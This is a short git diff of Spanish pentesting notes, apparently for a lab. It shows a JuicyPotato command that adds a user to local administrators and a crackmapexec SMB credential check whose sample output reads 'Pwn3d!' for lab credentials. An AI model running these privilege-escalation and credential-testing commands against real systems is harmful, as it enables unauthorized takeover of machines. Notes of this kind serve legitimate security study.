@@ -15,9 +15,14 @@ Juicy.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup admi
 En busca del pwned, chequeamos...
 ```bash
 crakmapexec smb IP -u paco -p paco123$
+
+Ejemplo de lo que buscamos
+# crackmapexec smb 192.168.177.10 -u administrator -p lab 
+SMB         192.168.177.10  445    CLIENT251        [*] Windows 10 Pro 16299 (name:CLIENT251) (domain:corp.com) (signing:False) (SMBv1:True)
+SMB         192.168.177.10  445    CLIENT251        [+] corp.com\administrator:lab (Pwn3d!)
 ```
 
-Si NO resulta pwned 
+Si NO resulta pwned procdemos a hacer lo siguiente
 
 # Sintaxis creando un nuevo recurso compartido a nivel de red
 
